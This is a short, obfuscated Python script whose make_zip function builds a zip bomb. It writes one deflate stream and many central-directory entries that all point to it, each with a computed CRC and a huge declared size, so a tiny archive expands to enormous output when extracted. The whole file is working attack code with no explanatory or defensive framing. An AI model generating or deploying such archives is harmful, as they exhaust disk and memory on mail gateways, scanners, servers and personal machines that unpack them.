# warning: minified
from functools import reduce as C
L=lambda a,b:bytes.fromhex(a%b)[::-1]
A=lambda i:L('%.8x',i)
I=lambda m,v:C(lambda i,j:i^j,[B*(v>>A&1)for(A,B)in enumerate(m)])
B=lambda i:b'\x00'*i
def make_zip(f,num_files,compressed_size):
	M,J,C,D,N,E=(1<<32)-1,num_files,compressed_size,[1<<A for A in range(33)],range(8),[0]*8
	for F in N:
		for S in N:E[F]=E[F]>>1^3988292384*((1<<F>>S^E[F])&1)
	G,H=C*1032-14447,E+D[:24]+[0];O=G
	while G:
		if G&1:D=[I(D,A)for A in H]
		H=[I(H,A)for A in H];G>>=1
	P=~ I(D,M)&M;K=f.write(b'PK\x03\x04\x14\x00\x00\x00\x08'+B(5)+A(P)+A(C)+A(O)+b'\x01\x00\x00\x000\xed\xc0\x81\x08\x00\x00\x00\xc0\xb0\xfbS_d\x0b'+B(C-15)+b'`');Q=K
	for T in range(J):R=str(T).encode();K+=f.write(b'PK\x01\x02\x14\x00\x14\x00\x00\x00\x08'+B(5)+A(P)+A(C)+A(O)+L('%.4x',len(R))+B(16)+R)
	f.write(b'PK\x05\x06'+B(4)+A(J+(J<<16))+A(K-Q)+A(Q)+B(2))
